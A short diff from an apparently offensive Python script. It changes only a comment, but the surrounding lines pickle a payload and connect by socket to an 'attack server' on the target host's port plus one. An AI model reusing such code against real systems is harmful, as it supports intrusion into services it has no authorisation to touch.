@@ -96,7 +96,7 @@ def main():
                     }
                     data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
 
-                    # Send to attack server on port+1 (e.g., 12346)
+                    # Send to attack server on port+1 (12346)
                     atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     atk.settimeout(3.0)
                     atk.connect((args.host, args.port + 1))
